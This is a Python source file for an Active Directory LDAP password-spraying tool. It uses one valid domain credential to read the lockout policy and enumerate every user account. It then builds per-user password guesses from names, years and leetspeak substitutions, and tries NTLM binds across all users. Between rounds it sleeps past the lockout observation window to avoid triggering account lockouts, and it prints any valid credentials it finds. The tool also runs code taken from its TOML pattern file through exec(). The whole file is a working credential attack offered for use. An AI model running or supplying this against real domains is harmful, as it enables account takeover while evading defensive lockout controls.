import argparse
import re
import time
import toml
from ldap3 import Server, Connection, ALL
from ldap3.core.exceptions import LDAPBindError
from typing import List, Dict
import os
from itertools import combinations
from datetime import datetime
import pytz
from datetime import datetime, timedelta, timezone

LEET_MAP = {
    'a': '4',
    'e': '3',
    'i': '1',
    'o': '0',
    's': '5',
    't': '7'
}

def parse_time_window(time_str):
    """Parse time in HH:MM format"""
    return datetime.strptime(time_str, "%H:%M").time()

def get_current_time():
    """Return the current UTC time"""
    return datetime.now(timezone.utc)


def calculate_total_duration(max_passwords, tries_per_wait, dynamic_delay, time_based_tries, start_time):
    """
    Calculate the estimated total duration of the bruteforce process based on the number of passwords,
    the number of tries per wait, the dynamic delay, and the time-based tries.

    max_passwords: Maximum number of passwords per user.
    tries_per_wait: Number of password attempts before waiting.
    dynamic_delay: Delay (in seconds) to add after each round of attempts.
    time_based_tries: List of tuples (tries, start_time, end_time) for time-based attempts.
    start_time: The UTC start time of the brute force process.
    """
    current_time = start_time

    total_tries = max_passwords

    while total_tries > 0:
        tries_per_round = get_tries_for_time(time_based_tries, current_time, tries_per_wait)
        total_tries -= tries_per_round

        # Move to the next time window
        current_time += timedelta(seconds=dynamic_delay)

    delta = current_time - start_time

    # Convert total time to hours, minutes, and seconds
    days = delta.days
    hours, remainder = divmod(delta.seconds, 3600)  # Get hours from remaining seconds
    minutes, seconds = divmod(remainder, 60)  # Get minutes and seconds from remainder

    return days, hours, minutes, seconds, current_time.strftime("%Y-%m-%d %H:%M:%S")


def parse_time_based_tries(tries_str):
    """
    Parse the time-based tries argument and return a list of tuples with
    (tries, start_time, end_time).
    """
    time_based_tries = []
    
    for rule in tries_str:
        tries, time_range = rule.split(":", 1)
        start_time, end_time = time_range.split("-")
        
        # Convert start_time and end_time to datetime objects
        # start_time = datetime.strptime(start_time, "%H:%M")
        # end_time = datetime.strptime(end_time, "%H:%M")
        
        # Store as a tuple
        time_based_tries.append((int(tries), start_time, end_time))
    
    return time_based_tries

def get_tries_for_time(time_based_tries, current_time, default):
    """Return the number of tries allowed based on the current time."""
    for tries, start_time, end_time in time_based_tries:
        start = parse_time_window(start_time)
        end = parse_time_window(end_time)

        if start <= end and start <= current_time.time() <= end:
            return tries
        if current_time.time() >= start or current_time.time() <= end:
            return tries
        
    return default  # Default tries per window if no match is found

def leetify(word: str, mode: int):
    leet_indices = [i for i, c in enumerate(word.lower()) if c in LEET_MAP]

    if mode == -1:
        # Replace all applicable characters
        return ''.join(LEET_MAP.get(c.lower(), c) for c in word)

    elif mode == 0:
        # All combinations (power set)
        results = set()
        for r in range(1, len(leet_indices)+1):
            for combo in combinations(leet_indices, r):
                w = list(word)
                for idx in combo:
                    w[idx] = LEET_MAP[w[idx].lower()]
                results.add(''.join(w))
        return list(results)

    elif mode > 0:
        # Combinations of exactly 'mode' length
        if mode > len(leet_indices):
            return []
        results = set()
        for combo in combinations(leet_indices, mode):
            w = list(word)
            for idx in combo:
                w[idx] = LEET_MAP[w[idx].lower()]
            results.add(''.join(w))
        return list(results)

def get_default_naming_context(server, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    return server.info.other['defaultNamingContext'][0]

def get_lockout_policy(server, base_dn, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    conn.search(base_dn, '(objectClass=domain)', attributes=['lockoutThreshold', 'lockoutDuration', 'lockoutObservationWindow', 'minPwdLength', 'pwdProperties'])
    entry = conn.entries[0]
    DOMAIN_PASSWORD_COMPLEX = 1
    pwd_properties  = int(entry['pwdProperties'].value)
    return {
        'pwdProperties' : bool(pwd_properties & DOMAIN_PASSWORD_COMPLEX),
        'lockoutThreshold': int(entry['lockoutThreshold'].value),
        'lockoutDuration': entry['lockoutDuration'].value.total_seconds(),
        'lockoutObservationWindow': entry['lockoutObservationWindow'].value.total_seconds(),
        'minPwdLength': int(entry['minPwdLength'].value)
    }

def enumerate_user_attributes(server, base_dn, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    conn.search(
        search_base=base_dn,
        search_filter='(&(objectCategory=person)(objectClass=user))',
        attributes=['sAMAccountName', 'givenName', 'sn']
    )
    return [
        {
            'sAMAccountName': entry['sAMAccountName'].value,
            'givenName': entry['givenName'].value if 'givenName' in entry else '',
            'sn': entry['sn'].value if 'sn' in entry else ''
        }
        for entry in conn.entries if 'sAMAccountName' in entry
    ]

def filter_users(user_attrs: List[Dict], exclude_regexes: List[str]) -> List[Dict]:
    patterns = [re.compile(rgx, re.IGNORECASE) for rgx in exclude_regexes]
    filtered = []
    for user in user_attrs:
        name = user['sAMAccountName']
        if any(p.search(name) for p in patterns):
            continue
        filtered.append(user)
    return filtered

def try_bind(server, domain, username, password):
    try:
        conn = Connection(server, user=f'{domain}\\{username}', password=password, auto_bind=True, authentication='NTLM')
        return True
    except LDAPBindError:
        return False

def generate_passwords_from_toml(config_path, user_attributes, min_length, custom_vars = {}):
    if os.path.isfile(config_path):
        config = toml.load(config_path)
    else:
        script_dir = os.path.dirname(os.path.realpath(__file__))
        alt_path = os.path.join(script_dir, config_path)
        if os.path.isfile(alt_path):
            config = toml.load(alt_path)
        else:
            raise FileNotFoundError(f"Could not find the TOML configuration file: {config_path}")

    all_passwords = []
    globals_config = config.get("globals", {})
    patterns = config.get("pattern", [])

    for entry in patterns:
        importance = entry.get("importance", 0)
        code = entry.get("code")
        years = entry.get("years", [])
        symbols = entry.get("symbols", [""])
        static = entry.get("static", False)

        if not isinstance(years, list):
            years = [str(years)]

        username = user_attributes.get("sAMAccountName", "")
        first_name = user_attributes.get("givenName", "")
        last_name = user_attributes.get("sn", "")

        if not first_name:
            continue

        passwords = []

        if code:
            local_vars = {
                "username": username,
                "first_name": first_name,
                "last_name": last_name,
                "passwords": passwords,
            }

            # Inject all other user-defined TOML variables into local_vars
            for k, v in entry.items():
                if k not in ("template", "code", "importance"):
                    local_vars[k] = v

            combined_vars = globals_config.copy()
            combined_vars.update(custom_vars)
            combined_vars.update(local_vars)
            exec(code, {}, combined_vars)


        for pw in passwords:
            if len(pw) >= min_length:
                all_passwords.append((importance, pw))
    return [pw for _, pw in sorted(all_passwords, key=lambda x: -x[0])]

def main():
    parser = argparse.ArgumentParser(description='LDAP Bruteforcer for Active Directory')
    parser.add_argument('--host', required=True, help='IP or hostname of the LDAP server')
    parser.add_argument('--domain', required=True, help='AD domain name (e.g., fabrikam.local)')
    parser.add_argument('--valid-user', required=True, help='A known valid domain user (for querying policies)')
    parser.add_argument('--valid-pass', required=True, help='Password of the valid domain user')
    parser.add_argument('--tries-per-wait', type=int, default=1, help='Number of password attempts before waiting for lockout observation window (Default: 1)')
    parser.add_argument('--exclude-regex', nargs='*', default=["Administrator", "krbtgt", "\\$$","MSOL.*", "service.*", "svc.*", "HealthBox.*", "Guest"], help='Regex patterns to exclude usernames')
    parser.add_argument('--patterns', default='patterns.toml', help='TOML file containing password generation patterns')
    parser.add_argument('--only-show-generated-passwords', action='store_true', help='Only print generated passwords without attempting login')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output for each login attempt')
    parser.add_argument('--extra-delay', type=int, default=10, help='Extra delay (in seconds) to add to the observation window before the next round (Default: 10)')
    parser.add_argument('--check', type=int, nargs='?', const=1, help='Only show policy and user filtering info. Use 2 to also show estimated duration and tries per user')
    parser.add_argument('--time-based-tries', nargs='*', default=[],
                        help='Number of tries followed by the time window, e.g., "3:18:00-03:00"')
    args = parser.parse_args()

    server = Server(args.host, get_info=ALL)
    base_dn = get_default_naming_context(server, args.domain, args.valid_user, args.valid_pass)
    policy = get_lockout_policy(server, base_dn, args.domain, args.valid_user, args.valid_pass)

    dynamic_delay = policy['lockoutObservationWindow'] + args.extra_delay if policy['lockoutObservationWindow'] > 0 else 1.0 + args.extra_delay

    print(f"[*] Lockout Threshold: {policy['lockoutThreshold']} attempts")
    print(f"[*] Lockout Observation Window: {policy['lockoutObservationWindow']} seconds")
    print(f"[*] Lockout Duration: {policy['lockoutDuration']} seconds")
    print(f"[*] Password Complexity: {policy['pwdProperties']}")
    print(f"[*] Minimum Password Length: {policy['minPwdLength']}")
    if args.verbose:
        print("[*] Enumerating users...")

    user_attrs = enumerate_user_attributes(server, base_dn, args.domain, args.valid_user, args.valid_pass)
    if args.verbose or args.check:
        print(f"[*] Found {len(user_attrs)} users before filtering")

    filtered_users = filter_users(user_attrs, args.exclude_regex)
    if args.verbose or args.check:
        print(f"[*] {len(filtered_users)} users remaining after filtering")

    if args.check == 1:
        return

    if policy['lockoutThreshold'] == 1:
        print("[!] Lockout threshold is 1. Bruteforce is too risky and will not be performed.")
        return
    
    time_based_tries = parse_time_based_tries(args.time_based_tries)

    user_passwords_map = {}
    max_passwords = 0

    for user in filtered_users:
        passwords = generate_passwords_from_toml(args.patterns, user, policy['minPwdLength'], {"complex_password" : policy['pwdProperties']})
        user_passwords_map[user['sAMAccountName']] = passwords
        max_passwords = max(max_passwords, len(passwords))

    if args.only_show_generated_passwords:
        for username, passwords in user_passwords_map.items():
            for pw in passwords:
                print(f"{username}:{pw}")
        return
    
    print(f"[*] Maximum passwords to try per user:")
    for username, passwords in user_passwords_map.items():
        print(f"{username}:{len(passwords)}")

    days, hours, minutes, seconds, end_time = calculate_total_duration(max_passwords, args.tries_per_wait, dynamic_delay, time_based_tries, get_current_time())
    print(f"[*] Estimated total bruteforce duration: {days} days, {hours} hours, {minutes} minutes, {seconds} seconds")
    print(f"[*] Estimated finish time (UTC): {end_time}")

    if args.check == 2:
        return

    found_for_user = []

    for i in range(max_passwords):
        tries_per_wait = get_tries_for_time(time_based_tries, get_current_time(), args.tries_per_wait)
        while tries_per_wait > 0:
            tries_per_wait -= 1
            print(f"[*] Trying password round {i+1}/{max_passwords}")
            for user in filtered_users:
                username = user['sAMAccountName']
                if username in found_for_user:
                    continue
                pw_list = user_passwords_map.get(username, [])
                if i < len(pw_list):
                    pw = pw_list[i]
                    success = try_bind(server, args.domain, username, pw)
                    if args.verbose:
                        print(f"[-] Tried {username}:{pw} => {'Success' if success else 'Fail'}")
                    if success:
                        found_for_user.append(username)
                        print(f"[+] VALID CREDENTIAL FOUND: {username}:{pw}")

        print(f"[*] Sleeping for {dynamic_delay:.2f} seconds to avoid lockout...")
        time.sleep(dynamic_delay)

if __name__ == '__main__':
    main()
